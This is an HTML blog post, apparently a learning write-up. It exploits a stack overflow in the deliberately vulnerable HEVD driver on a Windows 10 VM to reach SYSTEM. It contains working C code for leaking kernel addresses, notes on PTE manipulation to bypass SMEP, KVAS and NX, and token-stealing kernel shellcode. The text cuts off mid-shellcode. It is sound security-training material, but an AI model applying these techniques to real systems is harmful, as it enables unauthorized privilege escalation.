@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="windows kernelHEVD–栈溢出漏洞实现提权-1environment实验机器：windows 10 ltsc 2021 19044.6575 (Hyper-V 虚拟机) 最终目标：本地提权 (LPE) 至 NT AUTHORITY\SYSTEM  遇到的保护措施及绕过方案1. KASLR (内核地址空间布局随机化) 原理 ：系统启动时随机加载内核模块（如 ntoskrnl.exe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[HEVD]learning_windows_kernel">
+<meta property="og:url" content="https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/index.html">
+<meta property="og:site_name" content="wooo~ Exploooosion&#39;s blog">
+<meta property="og:description" content="windows kernelHEVD–栈溢出漏洞实现提权-1environment实验机器：windows 10 ltsc 2021 19044.6575 (Hyper-V 虚拟机) 最终目标：本地提权 (LPE) 至 NT AUTHORITY\SYSTEM  遇到的保护措施及绕过方案1. KASLR (内核地址空间布局随机化) 原理 ：系统启动时随机加载内核模块（如 ntoskrnl.exe">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://exploo0osion.github.io/image/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/1765094604279.png">
+<meta property="article:published_time" content="2025-12-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-07T09:32:28.141Z">
+<meta property="article:author" content="Exploooosion">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://exploo0osion.github.io/image/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/1765094604279.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>[HEVD]learning_windows_kernel</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/12/12/2025-12-12-windows_dll_injection/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/11/25/2025-11-25-learning_windows_pwn_3/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&text=[HEVD]learning_windows_kernel"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&title=[HEVD]learning_windows_kernel"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&is_video=false&description=[HEVD]learning_windows_kernel"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[HEVD]learning_windows_kernel&body=Check out this article: https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&title=[HEVD]learning_windows_kernel"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&title=[HEVD]learning_windows_kernel"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&title=[HEVD]learning_windows_kernel"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&title=[HEVD]learning_windows_kernel"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&name=[HEVD]learning_windows_kernel&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&t=[HEVD]learning_windows_kernel"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#windows-kernel"><span class="toc-number">1.</span> <span class="toc-text">windows kernel</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HEVD%E2%80%93%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E6%8F%90%E6%9D%83-1"><span class="toc-number">1.1.</span> <span class="toc-text">HEVD–栈溢出漏洞实现提权-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#environment"><span class="toc-number">1.1.1.</span> <span class="toc-text">environment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%A1%88"><span class="toc-number">1.1.2.</span> <span class="toc-text">遇到的保护措施及绕过方案</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-KASLR-%E5%86%85%E6%A0%B8%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%B8%83%E5%B1%80%E9%9A%8F%E6%9C%BA%E5%8C%96"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">1. KASLR (内核地址空间布局随机化)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SMEP-Supervisor-Mode-Execution-Prevention"><span class="toc-number">1.1.3.</span> <span class="toc-text">2. SMEP (Supervisor Mode Execution Prevention)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-KVAS-%E5%86%85%E6%A0%B8%E9%A1%B5%E8%A1%A8%E9%9A%94%E7%A6%BB-Kernel-Virtual-Address-Shadow"><span class="toc-number">1.1.4.</span> <span class="toc-text">3. KVAS (内核页表隔离 Kernel Virtual Address Shadow)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PTE-%E6%9D%83%E9%99%90%E4%BD%8D-MMPTE-HARDWARE-%E4%BB%A5%E5%8F%8A%E5%9C%B0%E5%9D%80%E8%AE%A1%E7%AE%97"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">PTE 权限位 (_MMPTE_HARDWARE)以及地址计算</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%8F%90%E6%9D%83%E6%89%8B%E6%AE%B5%EF%BC%9AToken-Stealing-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">1.1.5.</span> <span class="toc-text">4. 提权手段：Token Stealing (令牌窃取)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.1.6.</span> <span class="toc-text">5.相关结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EPROCESS-%E8%BF%9B%E7%A8%8B%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">_EPROCESS (进程结构体)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KTHREAD-%E7%BA%BF%E7%A8%8B%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">_KTHREAD (线程结构体)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KTRAP-FRAME-%E4%B8%AD%E6%96%AD%E5%B8%A7"><span class="toc-number">1.1.6.3.</span> <span class="toc-text">_KTRAP_FRAME (中断帧)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4-WinDbg"><span class="toc-number">1.1.7.</span> <span class="toc-text">6. 调试命令(WinDbg)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.8.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        [HEVD]learning_windows_kernel
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Exploooosion</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-12-01T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-12-02</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/windows/">windows</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <span id="more"></span>
+
+<h1 id="windows-kernel"><a href="#windows-kernel" class="headerlink" title="windows kernel"></a>windows kernel</h1><h2 id="HEVD–栈溢出漏洞实现提权-1"><a href="#HEVD–栈溢出漏洞实现提权-1" class="headerlink" title="HEVD–栈溢出漏洞实现提权-1"></a>HEVD–栈溢出漏洞实现提权-1</h2><h3 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h3><p>实验机器：windows 10 ltsc 2021 19044.6575 (Hyper-V 虚拟机)</p>
+<p>最终目标：本地提权 (LPE) 至 <code>NT AUTHORITY\SYSTEM</code></p>
+<p><img src="/image/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/1765094604279.png" alt="1765094604279"></p>
+<h3 id="遇到的保护措施及绕过方案"><a href="#遇到的保护措施及绕过方案" class="headerlink" title="遇到的保护措施及绕过方案"></a>遇到的保护措施及绕过方案</h3><h4 id="1-KASLR-内核地址空间布局随机化"><a href="#1-KASLR-内核地址空间布局随机化" class="headerlink" title="1. KASLR (内核地址空间布局随机化)"></a>1. KASLR (内核地址空间布局随机化)</h4><ul>
+<li><strong>原理</strong> ：系统启动时随机加载内核模块（如 <code>ntoskrnl.exe</code>）的基址，导致硬编码地址失效。</li>
+<li><strong>绕过手段</strong> ： <strong>信息泄露 (Info Leak)</strong> 。</li>
+<li><strong>实现</strong> ：利用 Windows API <code>EnumDeviceDrivers</code> 获取内核模块基址。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KASLR_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KASLR_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// 自动链接 Psapi.lib，免去手动配置 VS 属性的麻烦</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;psapi.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">// 获取内核模块基址的辅助函数</span></span><br><span class="line"><span class="comment">// 使用 static 关键字防止在多个 .c 文件引用时出现重定义错误</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title function_">GetKernelModuleAddress</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* targetModuleName)</span> &#123;</span><br><span class="line">    LPVOID drivers[<span class="number">1024</span>];</span><br><span class="line">    DWORD cbNeeded;</span><br><span class="line">    <span class="type">int</span> cDrivers, i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> address = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 1. 获取所有驱动的加载地址列表</span></span><br><span class="line">    <span class="keyword">if</span> (EnumDeviceDrivers(drivers, <span class="keyword">sizeof</span>(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; <span class="keyword">sizeof</span>(drivers)) &#123;</span><br><span class="line">        cDrivers = cbNeeded / <span class="keyword">sizeof</span>(drivers[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">// 2. 遍历列表，查找名字匹配的驱动</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cDrivers; i++) &#123;</span><br><span class="line">            <span class="type">char</span> szDriver[MAX_PATH];</span><br><span class="line">            <span class="comment">// 获取驱动的基础名称 (例如 ntoskrnl.exe)</span></span><br><span class="line">            <span class="keyword">if</span> (GetDeviceDriverBaseNameA(drivers[i], szDriver, <span class="keyword">sizeof</span>(szDriver) / <span class="keyword">sizeof</span>(szDriver[<span class="number">0</span>]))) &#123;</span><br><span class="line">                <span class="comment">// 不区分大小写比较</span></span><br><span class="line">                <span class="keyword">if</span> (_stricmp(szDriver, targetModuleName) == <span class="number">0</span>) &#123;</span><br><span class="line">                    address = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)drivers[i];</span><br><span class="line">                    <span class="comment">// 这里可以注释掉打印，以免干扰 EXP 的输出</span></span><br><span class="line">                    <span class="comment">// printf(&quot;[+] Found %s at address: 0x%llx\n&quot;, szDriver, address);</span></span><br><span class="line">                    <span class="keyword">break</span>; </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] EnumDeviceDrivers failed or buffer too small.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// KASLR_H</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-SMEP-Supervisor-Mode-Execution-Prevention"><a href="#2-SMEP-Supervisor-Mode-Execution-Prevention" class="headerlink" title="2. SMEP (Supervisor Mode Execution Prevention)"></a>2. SMEP (Supervisor Mode Execution Prevention)</h3><ul>
+<li><strong>原理</strong> ：CR4 寄存器第 <strong>20</strong> 位置 1。禁止 Ring 0 (内核) 执行 Ring 3 (用户) 页面的代码。</li>
+<li><strong>尝试过的手段</strong> ：ROP 修改 CR4 ( <code>mov cr4, rcx</code> )。</li>
+<li><strong>局限性</strong> ：虽然关闭了硬件 SMEP，但无法绕过 KVAS。</li>
+</ul>
+<h3 id="3-KVAS-内核页表隔离-Kernel-Virtual-Address-Shadow"><a href="#3-KVAS-内核页表隔离-Kernel-Virtual-Address-Shadow" class="headerlink" title="3. KVAS (内核页表隔离 Kernel Virtual Address Shadow)"></a>3. KVAS (内核页表隔离 <strong>Kernel</strong> <strong>Virtual</strong> <strong>Address</strong> <strong>Shadow</strong>)</h3><ul>
+<li><strong>原理</strong> ：开启KVAS时，应用程序会有两个CR3，即有PCB.DirectoryTableBase和PCB.UserDirectoryTableBase两个域。其中DirectoryTableBase域可以理解为内核CR3，能够访问内核物理页，而ring3的Cr3（UserDirectoryTableBase）只映射了内核的KVASCODE区段的物理页（少数r3进入r0的入口），而没有映射其他区段的，因此通过ring3的Cr3寻找内核TEXT段的物理页，最多只能找到PPE，而从PDE开始就没有映射了。</li>
+<li><strong>遇到的坑</strong> ：</li>
+</ul>
+<ol>
+<li>直接跳转用户态 Shellcode -&gt; <code>Access Violation (0xC0000005)</code> (因为找不到页面)。</li>
+</ol>
+<ul>
+<li><strong>最终绕过手段</strong> ： <strong>PTE 篡改 (PTE Manipulation)</strong> 。</li>
+<li><strong>思路</strong> ：不回用户态，而是将 Shellcode 搬运到内核空间。</li>
+<li><strong>目标</strong> ：<code>KUSER_SHARED_DATA</code> (<code>0xFFFFF78000000000</code>)。用户空间和内核空间的共享区域，地址<strong>固定</strong>，内核程序对这块共享区域有<strong>可读</strong>、<strong>可写</strong>的权限，用户程序对这块共享区域只有<strong>只读</strong>的权限。</li>
+<li><strong>操作</strong> ：利用 ROP 修改该页面的  <strong>PTE (页表项)</strong> ，清除 <strong>NX (No-Execute)</strong> 位。</li>
+</ul>
+<h4 id="PTE-权限位-MMPTE-HARDWARE-以及地址计算"><a href="#PTE-权限位-MMPTE-HARDWARE-以及地址计算" class="headerlink" title="PTE 权限位 (_MMPTE_HARDWARE)以及地址计算"></a>PTE 权限位 (<code>_MMPTE_HARDWARE</code>)以及地址计算</h4><p>PTE 本质上是一个 64位 (8字节) 的数值。我们需要精准控制其中的某一位。</p>
+<p><strong>PTE 关键位布局 (Bit Map):</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_MMPTE_HARDWARE</span><br><span class="line">   +0x000 Valid            : Pos 0, 1 Bit</span><br><span class="line">   +0x000 Dirty1           : Pos 1, 1 Bit</span><br><span class="line">   +0x000 Owner            : Pos 2, 1 Bit</span><br><span class="line">   +0x000 WriteThrough     : Pos 3, 1 Bit</span><br><span class="line">   +0x000 CacheDisable     : Pos 4, 1 Bit</span><br><span class="line">   +0x000 Accessed         : Pos 5, 1 Bit</span><br><span class="line">   +0x000 Dirty            : Pos 6, 1 Bit</span><br><span class="line">   +0x000 LargePage        : Pos 7, 1 Bit</span><br><span class="line">   +0x000 Global           : Pos 8, 1 Bit</span><br><span class="line">   +0x000 CopyOnWrite      : Pos 9, 1 Bit</span><br><span class="line">   +0x000 Unused           : Pos 10, 1 Bit</span><br><span class="line">   +0x000 Write            : Pos 11, 1 Bit</span><br><span class="line">   +0x000 PageFrameNumber  : Pos 12, 36 Bits</span><br><span class="line">   +0x000 ReservedForHardware : Pos 48, 4 Bits</span><br><span class="line">   +0x000 ReservedForSoftware : Pos 52, 4 Bits</span><br><span class="line">   +0x000 WsleAge          : Pos 56, 4 Bits</span><br><span class="line">   +0x000 WsleProtection   : Pos 60, 3 Bits</span><br><span class="line">   +0x000 NoExecute        : Pos 63, 1 Bit</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>位 (Bit)</th>
+<th>名称</th>
+<th>说明</th>
+<th>EXP 关注点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>63(最高位)</td>
+<td>NX (No-Execute)</td>
+<td>1&#x3D;禁止执行 , 0&#x3D;允许执行</td>
+<td>攻击目标！我们要把它置 0</td>
+</tr>
+<tr>
+<td>12-62</td>
+<td>PFN</td>
+<td>物理页帧号 (实际物理地址)</td>
+<td>动了就找不到物理内存了</td>
+</tr>
+<tr>
+<td>2</td>
+<td>U&#x2F;S (User&#x2F;Supervisor)</td>
+<td>0&#x3D;内核页, 1&#x3D;用户页</td>
+<td>保持 0 (内核页)</td>
+</tr>
+<tr>
+<td>1</td>
+<td>R&#x2F;W (Read&#x2F;Write)</td>
+<td>1&#x3D;可写, 0&#x3D;只读</td>
+<td>保持 1 (我们需要写入 Shellcode)</td>
+</tr>
+<tr>
+<td>0</td>
+<td>P (Present)</td>
+<td>1&#x3D;页面有效 , 0&#x3D;无效</td>
+<td>置 0 会直接缺页蓝屏</td>
+</tr>
+</tbody></table>
+<p><strong>PTE 地址计算公式：</strong></p>
+<p>在 Windows x64 中，页表本身也映射在虚拟内存中。计算公式如下：</p>
+<p>$$<br>\text{PTE_Addr} &#x3D; \text{PTE_BASE} + (\text{VirtualAddress} \gg 9) \times 8<br>$$</p>
+<p>或者用位运算优化版（我们在 EXP 中用的）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PTE_Addr = PTE_BASE + (VirtualAddress &gt;&gt; 9) &amp; 0x7FFFFFFFF8</span><br></pre></td></tr></table></figure>
+
+<p><strong>Win10 1607 (RS1) 及之后</strong> ：为了安全，微软引入了  <strong>页表基址随机化</strong> 。</p>
+<p><strong>原理</strong> ：PML4 表（顶级页表）有 512 个条目。系统启动时，随机选择一个条目（例如第 <code>idx</code> 项）指向 PML4 自身。</p>
+<p><strong>绕过随机化</strong>：利用 <code>MiGetPteAddress</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000140298780 MiGetPteAddress proc near               ; CODE XREF: MiPfPrepareSequentialReadList+2D0↓p</span><br><span class="line">.text:0000000140298780                                         ; MiPfPrepareSequentialReadList+2DB↓p ...</span><br><span class="line">.text:0000000140298780                 shr     rcx, 9</span><br><span class="line">.text:0000000140298784                 mov     rax, 7FFFFFFFF8h</span><br><span class="line">.text:000000014029878E                 and     rcx, rax</span><br><span class="line">.text:0000000140298791                 mov     rax, 0FFFFF68000000000h ; 这里的立即数就是动态的 PTE_BASE</span><br><span class="line">.text:000000014029879B                 add     rax, rcx</span><br><span class="line">.text:000000014029879E                 retn</span><br><span class="line">.text:000000014029879E MiGetPteAddress endp</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-提权手段：Token-Stealing-令牌窃取"><a href="#4-提权手段：Token-Stealing-令牌窃取" class="headerlink" title="4. 提权手段：Token Stealing (令牌窃取)"></a>4. 提权手段：Token Stealing (令牌窃取)</h3><p><strong>原理</strong> ：遍历系统进程链表，找到 System 进程 (PID 4)，将其 Token 复制给当前进程。</p>
+<p> <strong>Shellcode 逻辑</strong> ：</p>
+<ol>
+<li>获取当前进程 <code>_EPROCESS</code>。</li>
+<li>遍历 <code>ActiveProcessLinks</code> 链表。</li>
+<li>匹配 <code>UniqueProcessId == 4</code>。</li>
+<li>读取 System Token，写入当前进程的 Token 字段。</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">	xor rax, rax</span><br><span class="line">	mov rax, [gs:rax + 188h]		; gs[0] == KPCR, Get KPCRB.CurrentThread field</span><br><span class="line">	mov rax, [rax+0xb8]		; Get (KAPC_STATE)ApcState.Process (our EPROCESS)</span><br><span class="line">	mov r9, rax;			; Backup target EPROCESS at r9</span><br><span class="line"></span><br><span class="line">	; loop processes list</span><br><span class="line">	mov rax, [rax + 0x448]	; +0x448 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link</span><br><span class="line">	mov rax, [rax]			; Follow the first link</span><br><span class="line">system_process_loop:</span><br><span class="line">	mov rdx, [rax - 0x8]	; ProcessId</span><br><span class="line">	mov r8, rax;			; backup system EPROCESS.ActiveProcessLinks pointer at r8</span><br><span class="line">	mov rax, [rax]			; Next process</span><br><span class="line">	cmp rdx, 4			; System PID</span><br><span class="line">	jnz system_process_loop</span><br><span class="line"></span><br><span class="line">	mov rdx, [r8 + 0x70]</span><br><span class="line">	and rdx, 0xfffffffffffffff8			; Ignore ref count</span><br><span class="line">	mov rcx, [r9 + 0x4b8]</span><br><span class="line">	and rcx, 0x7</span><br><span class="line">	add rdx, rcx				; put target&#x27;s ref count into our token</span><br><span class="line">	mov [r9 + 0x4b8], rdx		; rdx = system token; KPROCESS+0x4b8 is the Token, KPROCESS+0x448 is the process links - 0x70 is the diff</span><br><span class="line"></span><br><span class="line">	;db 